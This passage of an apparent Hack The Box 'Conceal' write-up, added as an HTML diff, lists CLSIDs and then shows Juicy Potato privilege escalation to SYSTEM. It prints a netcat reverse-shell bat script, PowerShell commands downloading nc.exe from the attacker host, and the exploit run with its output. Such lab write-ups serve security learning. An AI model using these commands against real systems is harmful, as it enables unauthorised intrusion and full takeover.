+{B441840A-5CEF-42F1-BE06-4E31A90E74D7};NT AUTHORITY\LOCAL SERVICE
+{B7BC3EB9-B145-4574-B729-7D78126EB4C8};NT AUTHORITY\LOCAL SERVICE
+{A8BE33B3-D275-459B-A853-A2150531C8B3};NT AUTHORITY\LOCAL SERVICE
+{9694B5A2-54CE-4837-BA0A-F52FD7699F12};NT AUTHORITY\LOCAL SERVICE
+{A0D76288-0FB2-477A-96F9-F7EFFD7ED5D3};NT AUTHORITY\LOCAL SERVICE
+{CC9FA1A3-ADDE-49A9-B435-34CE6E5DA3DB};NT AUTHORITY\LOCAL SERVICE
+{F1B75166-312C-4DC6-BA41-C2E2486C9913};NT AUTHORITY\LOCAL SERVICE
+{F94358B1-E9AE-4D5C-AF66-CE50E67803C7};NT AUTHORITY\LOCAL SERVICE
+{EA5EAA7B-1E81-4C76-BF2D-F2A867F764A1};NT AUTHORITY\LOCAL SERVICE
+{DAB26424-5F5C-4834-8685-A4DB44DF8083};NT AUTHORITY\LOCAL SERVICE
+{DF175E5E-5488-49B7-BCB9-B7204933E26F};NT AUTHORITY\LOCAL SERVICE
+{4D098DC6-3080-4A11-9887-4C77FD7C2ED2};NT AUTHORITY\LOCAL SERVICE
+{46B559E9-0D2F-44AC-9EE7-AE6D9384B292};NT AUTHORITY\LOCAL SERVICE
+{557C6CBF-CD77-45CF-84E8-8F5A8A331BAD};NT AUTHORITY\LOCAL SERVICE
+{37998346-3765-45B1-8C66-AA88CA6B20B8};NT AUTHORITY\LOCAL SERVICE
+{206490E7-09B5-4C9D-8E54-254B87A5CEAF};NT AUTHORITY\LOCAL SERVICE
+{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029};NT AUTHORITY\LOCAL SERVICE
+{235EB944-F722-47DB-8EE7-1EE27A8D4F98};NT AUTHORITY\LOCAL SERVICE
+{21F282D1-A881-49E1-9A3A-26E44E39B86C};NT AUTHORITY\LOCAL SERVICE
+{7ECB3DBE-742D-4B43-BF3E-2587BE1BFF72};NT AUTHORITY\LOCAL SERVICE
+{770FDC97-76E7-4067-B14C-2DDB3A7517F2};NT AUTHORITY\LOCAL SERVICE
+{8190FA8C-3A62-49FB-B145-071B4B74578D};NT AUTHORITY\LOCAL SERVICE
+{7ECC8054-7AE3-486D-9CBA-8ED0B5ED61AC};NT AUTHORITY\LOCAL SERVICE
+{754EC012-E0B0-4F32-A810-77F639CBF103};NT AUTHORITY\LOCAL SERVICE
+{73978CED-828C-49AB-A403-9ABACDCE1505};NT AUTHORITY\LOCAL SERVICE
+{680442B0-692A-465C-B47D-783C4EC5B6A2};NT AUTHORITY\LOCAL SERVICE
+{d20a3293-3341-4ae8-9aaf-8e397cb63c34};NT AUTHORITY\SYSTEM
+{42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\SYSTEM
+{42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\SYSTEM
+{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\SYSTEM
+{C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\SYSTEM
+{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
+{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD};NT AUTHORITY\SYSTEM
+{22f5b1df-7d7a-4d21-97f8-c21aefba859c};NT AUTHORITY\LOCAL SERVICE
+{5BF9AA75-D7FF-4aee-AA2C-96810586456D};NT AUTHORITY\LOCAL SERVICE
+{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
+{581333F6-28DB-41BE-BC7A-FF201F12F3F6};NT AUTHORITY\LOCAL SERVICE
+{47135eea-06b6-4452-8787-4a187c64a47e};NT AUTHORITY\SYSTEM
+{687e55ca-6621-4c41-b9f1-c0eddc94bb05};NT AUTHORITY\SYSTEM
+{B31118B2-1F49-48E5-B6F5-BC21CAEC56FB};NT AUTHORITY\SYSTEM
+{6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
+{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
+{B91D5831-B1BD-4608-8198-D72E155020F7};NT AUTHORITY\SYSTEM
+{97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\SYSTEM
+{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
+{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
+{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM
+{B52D54BB-4818-4EB9-AA80-F9EACD371DF8};NT AUTHORITY\SYSTEM
+{E63DE750-3BD7-4BE5-9C84-6B4281988C44};NT AUTHORITY\SYSTEM
+{E48EDA45-43C6-48e0-9323-A7B2067D9CD5};NT AUTHORITY\SYSTEM
+{A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6};NT AUTHORITY\SYSTEM
+{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39};NT AUTHORITY\SYSTEM
+{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\SYSTEM
+{9E175B6D-F52A-11D8-B9A5-505054503030};NT AUTHORITY\SYSTEM
+{9E175B68-F52A-11D8-B9A5-505054503030};NT AUTHORITY\SYSTEM
+{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
+{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
+{5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM
+{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+</pre>
+
+<p>We will make <code>Juicy Potato</code> execute a reverse shell with <code>nc</code> but since it doesn't accept arguments we can create the following <code>bat</code> script instead.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# cat shell.bat 
+@echo on
+C:\Users\Public\nc.exe 10.10.16.38 6767 -e cmd.exe
+</pre>
+
+<p>Upload <code>nc.exe</code> binary and the <code>bat</code> script to the machine.</p>
+
+<pre class="prettyprint">
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/nc.exe","C:\Users\Public\nc.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/shell.bat","C:\Users\Public\shell.bat")
+</pre>
+
+<p>Now we can run <code>Juicy Potato</code> using as payload the <code>bat</code> script, in <code>-c</code> one <code>CLSID</code> from <code>NT AUTHORITY\SYSTEM</code>, <code>-t *</code> to try both <code>CreateProcessWithTokenW</code> and <code>CreateProcessAsUser</code> and in <code>-l</code> a random port to listen on.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Public> C:\Users\Public\JuicyPotato.exe -l 1337 -p C:\Users\Public\shell.bat -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+......
+[+] authresult 0
+{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+</pre>
+
+<p>If we're listening on the specified port we get a shell as <code>nt authority\system</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# nc -nlvp 6767
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6767
+Ncat: Listening on 0.0.0.0:6767
+Ncat: Connection from 10.10.10.116.
+Ncat: Connection from 10.10.10.116:50777.
+Microsoft Windows [Version 10.0.15063]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+</pre>
+
+<pre class="prettyprint">
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+<span flag="5737DD2EDC29B5B219BC43E60866BE08">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
